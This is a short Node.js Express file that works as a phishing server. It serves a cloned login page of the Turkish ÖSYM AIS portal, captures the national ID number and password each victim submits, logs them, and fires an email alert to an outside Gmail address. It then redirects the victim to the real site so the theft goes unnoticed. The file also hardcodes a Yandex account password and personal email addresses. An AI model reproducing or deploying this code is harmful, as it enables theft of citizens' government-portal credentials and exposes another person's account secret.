const express = require('express')
const path = require('path');
const app = express()
const port = 3000
const bodyParser = require('body-parser');
const { application } = require('express');
const nodemailer = require('nodemailer');
const transporter = nodemailer.createTransport({
    service: 'yandex',
    auth:{
      user: 'ars-grup.engineering@yandex.com',
      pass: 'bdytcpfrulkrqpif'
    }
});

app.use(bodyParser());

app.use(express.static("public"));

app.get('/', (req, res) => {
  res.sendFile(path.join('C:/Users/YSARS/Desktop/SONN/a/ais.osym.gov.tr/yetki/giris.html'))
})


app.post('/', (req, res) => {
  const tcNo = req.body.TcKimlikNo;
  const pass = req.body.Sifre;
  console.log(tcNo,pass);
  sendEmail(tcNo,pass);
  res.redirect('https://ais.osym.gov.tr/yetki/giris')
  
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})

const sendEmail = (tcNo,pass)=>{
  transporter.sendMail({
      
      
      to: "ysarslanturk@gmail.com",
      from: "ars-grup.engineering@yandex.com",
      subject: "Yeni Login",
    
      
  });


}
